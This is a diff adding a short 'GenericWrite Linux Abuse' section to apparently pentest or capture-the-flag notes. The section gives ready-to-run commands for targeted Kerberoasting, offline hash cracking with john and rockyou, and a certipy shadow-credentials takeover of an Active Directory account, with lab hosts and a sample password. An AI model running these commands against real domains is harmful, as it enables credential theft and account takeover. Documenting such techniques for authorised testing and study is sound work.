@@ -7,6 +7,30 @@ metaLinks:
 
 # GenericWrite
 
+## GenericWrite Linux Abuse
+
+{% code overflow="wrap" %}
+```bash
+targetedKerberoast.py -d 'novacart.local' -u 'cliff.b' -p 'safEpAss69' --dc-ip '192.168.178.86'
+```
+{% endcode %}
+
+crack the hash
+
+{% code overflow="wrap" %}
+```bash
+john --wordlist="/usr/share/wordlists/rockyou.txt" hashes.txt
+```
+{% endcode %}
+
+If password can not be crack we can try with certipy
+
+{% code overflow="wrap" %}
+```bash
+certipy-ad shadow auto -u 'username@hello.htb' -p 'Password' -dc-ip 10.129.11.xxx -target DC01.hello.htb -account target_username 
+```
+{% endcode %}
+
 ## GenericWrite
 
 ### User
